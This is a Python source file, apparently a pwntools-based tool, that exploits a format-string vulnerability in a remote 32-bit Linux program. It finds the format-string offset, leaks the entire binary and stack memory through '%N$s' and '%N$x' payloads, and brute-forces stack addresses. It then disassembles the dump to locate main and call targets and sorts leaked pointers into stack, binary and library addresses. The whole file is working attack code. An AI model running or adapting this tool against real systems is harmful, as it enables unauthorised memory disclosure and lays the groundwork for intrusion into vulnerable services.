# coding=utf-8


from Queue import Queue
from itertools import tee
from pwn import *
from capstone import *


context(arch="i386", os="linux")


class Leaker(object):
    def __init__(self, target, method="global", null=False,
                 verbosity="info"):
        self._process = target
        self._method = method
        self._null = null
        self._verbosity = verbosity
        context.log_level = verbosity
        if self._method != "global" and self._method != "step":
            raise PwnlibException("Invalid dump method: global or step")
        self._baseaddr = 0x08048000
        self._offset = 0
        self._dyn = None
        self._md = Cs(CS_ARCH_X86, CS_MODE_32)
        self._calls = []
        self._stack = []
        self._bin = []
        self._lib = []
        self._subs = {}
        self._stackQ = Queue()
        self._buffer = []
        self._function = ""
        self._main = ""
        self._binary = ""
        self._pop_ebp_ret = asm("pop ebp") + asm("ret")
        self._pop_ebx_ret = asm("pop ebx") + asm("ret")
        self._ret = asm("ret")
        self._hlt_nop_nop = asm("hlt") + asm("nop") + asm("nop")
        self._hlt = asm("hlt")
        self._xor_ebp_ebp_pop_esi = asm("xor ebp,ebp") + asm("pop esi")

    def _send(self, msg):
        self._process.send(msg)
        return self

    def _recv(self, number=4096):
        return self._process.recv(number)

    def send(self, msg):
        self._send(msg)
        return self

    def recv(self, number=4096):
        return self._recv(number)

    def _leak_binary(self, addr):
        context.log_level = 'error'
        if isinstance(addr, int):
            a = pack(addr)
            if self._null and "\x00" not in a:
                self._send("%s_@|@_%%%d$s" % (a, self._offset))
        else:
            self._send("%s_@|@_%%%d$s" % (addr, self._offset))
        res = self._recv()
        context.log_level = self._verbosity
        if res != "":
            return res.split("_@|@_")[1]
        return None

    def _leak_stack(self, nth):
        context.log_level = 'error'
        self._send("%%%d$08x" % nth)
        context.log_level = self._verbosity
        return self._recv()

    def _detect_leak_offset(self):
        progress = log.progress("Looking for leak offset...")
        for i in range(0, 0xffff):
            progress.status(str(i))
            self._offset = i
            context.log_level = 'error'
            res = self._send("AAAA%%%d$08x" % i)._recv()
            context.log_level = self._verbosity
            if "41414141" in res:
                break
        progress.success("done! Found offset %d" % self._offset)

    def _dump_binary(self):
        progress = log.progress("Dumping the whole binary...")
        consecutive_zeroes = 0
        n = -1
        binary = ""
        for addr in range(self._baseaddr, 0x0804ffff):
            n += 1
            progress.status("address %s" % hex(addr))
            packed_addr = pack(addr)
            if self._null and "\x00" in packed_addr:
                if addr == self._baseaddr:
                    binary += "\x7f"
                else:
                    packed_addr = pack(addr-1)
                    try:
                        res = self._leak_binary(packed_addr)
                    except EOFError:
                        break
                    if len(res) > 1:
                        binary += res[1]
                    else:
                        if consecutive_zeroes > 100:
                            log.debug("Null byte in address at "
                                      "offset %s with \\x00"
                                      % hex(n))
                            consecutive_zeroes = 0
                            binary += "\x00"
                        else:
                            log.debug("Null byte in address at "
                                      "offset %s with \\xcc"
                                      % hex(n))
                            binary += "\xcc"
                continue
            try:
                res = self._leak_binary(packed_addr)
            except EOFError:
                break
            if res is not None:  # and "(null)" not in res:
                if res == "" or "(null)" in res:
                    binary += "\x00"
                    consecutive_zeroes += 1
                else:
                    consecutive_zeroes = 0
                    binary += res[0]
        context.log_level = self._verbosity
        progress.success("done! Last address %s" %
                         hex(self._baseaddr + n))
        self._binary = binary

    def _is_call(self, i, frame_calls):
        if i.op_str.startswith("0x804") or i.op_str.startswith("0xb7"):
            addr = i.op_str[2:]
            if addr not in self._calls:
                log.debug("Call found at address 0x%x in function %s: "
                          "%s" % (i.address, self._function, addr))
                frame_calls.append(addr)
                self._calls.append(addr)
        return frame_calls

    def _disassemble(self, code, base, find_main=False):
        frame_calls = []
        dis = self._md.disasm(code, base)
        for i in dis:
            # finding calls
            if i.mnemonic == "call":
                frame_calls = self._is_call(i, frame_calls)
            # finding main
            if i.mnemonic == "push" and self._main == "" \
                    and find_main is True:
                if i.op_str == "ecx":
                    dis, discpy = tee(dis)
                    x = pwnlib.util.iters.lookahead(0, discpy)
                    if x.mnemonic == "push" and x.op_str != "esi":
                        continue
                    try:
                        x = pwnlib.util.iters.lookahead(1, discpy)
                    except IndexError:
                        continue
                    else:
                        if x.mnemonic == "push":
                            frame_calls = self._is_call(x, frame_calls)
                        if len(frame_calls) > 0:
                            break
        return frame_calls

    def _find_main(self):
        progress = log.progress("Looking for main...")
        frame_calls = []
        for i in range(0, len(self._binary)):
            b = self._binary[i:i+30]
            if b.startswith(self._xor_ebp_ebp_pop_esi):
                self._function = "_start"
                log.debug("Found _start at 0x0%x" % (self._baseaddr+i))
                frame_calls = self._disassemble(self._binary[i:],
                                                self._baseaddr+i, True)
                self._main = int(frame_calls[0], 16)
                self._main_offset = i
                # self._dyn = DynELF(self._leak_binary, self._main)
                break
        if len(frame_calls) == 0:
            progress.failure("done! main not found!")
        else:
            progress.success("done! main is at %s" % frame_calls[0])

    def _find_calls(self):
        progress = log.progress("Looking for calls...")
        for i in range(0, len(self._binary)):
            if self._binary[i] == "\xe8":
                self._disassemble(self._binary[i:], self._baseaddr+i)
        sorted(self._calls)
        progress.success("done! Found %d calls" % len(self._calls))

    def _inspect_stack_data(self):
        context.log_level = "debug"
        progress = log.progress("Extracting data from stack "
                                "addresses...")
        self._process.reconnect()
        printset = set(string.printable)
        while not self._stackQ.empty():
            addr = self._stackQ.get()
            try:
                res = self._leak_binary(int(addr, 16))
            except EOFError:
                break
            t = False
            if len(res) >= 4:
                gp = group(4, res)
                for adr in gp:
                    try:
                        un = hex(unpack(adr))[2:]
                    except ValueError:
                        continue
                    else:
                        if un.startswith("bfff"):
                            t = True
                            if un not in self._stack:
                                log.debug("Found stack address %s at "
                                          "address %s" % (un, addr))
                                self._stack.append(un)
                                self._stackQ.put(addr)
                            elif un.startswith("0804") or \
                                    un.startswith("804"):
                                t = True
                                if un not in self._bin:
                                    log.debug("Found binary address %s "
                                              "at address %s"
                                              % (un, addr))
                                    self._bin.append(un)
                            elif un.startswith("b7"):
                                t = True
                                if un not in self._lib:
                                    log.debug("Found lib address %s at "
                                              "address %s" % (un, addr))
                                    self._lib.append(un)
            if t is False:
                if set(res).issubset(printset) and res != "":
                    log.info("Found string \"%s\" at address %s"
                             % (res, addr))
                elif res != "":
                    log.debug("Found junk (hex) \"%s\" at address %s"
                              % (enhex(res), addr))
        context.log_level = self._verbosity
        progress.success("done!")

    def _inspect_bin_data(self):
        progress = log.progress("Extracting data from binary "
                                "addresses...")
        self._process.reconnect()
        printset = set(string.printable)
        for addr in self._bin:
            try:
                res = self._leak_binary(int(addr, 16))
            except EOFError:
                continue
            else:
                if set(res).issubset(printset) and res != "":
                    log.info("Found string \"%s\" at address %s"
                             % (res, addr))
        context.log_level = self._verbosity
        progress.success("done!")

    def _inspect_data(self, found):
        printset = set(string.printable)
        progress = log.progress("Examining data found...")
        for offset, value in found.items():
            if offset == value:
                self._buffer.append(value)
                log.success("Input buffer found at address %s"
                            % value)
            if value.startswith("b7"):
                if value not in self._lib:
                    log.debug("Found lib address %s at offset %s"
                              % (value, offset))
                    self._lib.append(value)
            elif value.startswith("bfff"):
                if value not in self._stack:
                    log.debug("Found stack address %s at offset %s"
                              % (value, offset))
                    self._stack.append(value)
                    self._stackQ.put(value)
            elif value.startswith("0804") or value.startswith("804"):
                if value not in self._bin:
                    log.debug("Found binary address %s at offset %s"
                              % (value, offset))
                    self._bin.append(value)
            else:
                try:
                    v = value.decode("hex")
                except TypeError:
                    pass
                else:
                    if set(v).issubset(printset):
                        log.info("Found string \"%s\" at offset %s"
                                 % (v, offset))
                    else:
                        log.debug("Found junk (hex) \"%s\" at address "
                                  "%s" % (enhex(value), offset))
        context.log_level = self._verbosity
        progress.success("data examined!")

    def _dump_stack(self):
        progress = log.progress("Dumping the stack...")
        self._process.reconnect()
        found = {}
        try:
            for i in range(0, 0xfff):
                progress.status("%s" % hex(i))
                res = self._leak_stack(i)
                if res != "00000000" and res != "":
                    if res.startswith("0"):
                        res = res[1:]
                    found[i] = res
                    log.debug("Found %s at %s" % (res, hex(i)))
        except EOFError:
            pass
        context.log_level = self._verbosity
        progress.success("done!")
        progress = log.progress("Bruteforcing stack addresses...")
        self._process.reconnect()
        ref = ""
        for addr in range(0xbffff000, 0xbfffffff):
            progress.status(hex(addr))
            packed_addr = pack(addr)
            addr = hex(addr)[2:]
            if self._null and "\x00" in packed_addr:
                continue
            res = self._leak_binary(packed_addr)
            if res is not None and res != "" and "(null)" not in res \
                    and not res.isspace():
                if ref == "" or len(res) > ref:
                    if len(res) >= 4:
                        gp = group(4, res)
                        for adr in gp:
                            try:
                                un = hex(unpack(adr))[2:]
                            except ValueError:
                                continue
                            else:
                                found[addr] = un
                    ref = res
            else:
                ref = ""
        context.log_level = self._verbosity
        progress.success("done! Last stack address %s" % addr)
        return found

    def _save_to_file(self):
        with open("dump/binary.dmp", "wb") as f:
            f.write(self._binary)

    def dump(self):
        self._detect_leak_offset()
        if self._method == "global":
            self._dump_binary()
            self._save_to_file()
            self._find_main()
            self._find_calls()
        found = self._dump_stack()
        self._inspect_data(found)
        self._process.reconnect()
        self._inspect_stack_data()
        self._inspect_bin_data()
        return self

    def get_bin(self):
        return self._calls + self._bin

    def get_stack(self):
        return self._stack

    def get_lib(self):
        return self._lib

    def get_buffer(self):
        return self._buffer

    def get_offset(self):
        return self._offset
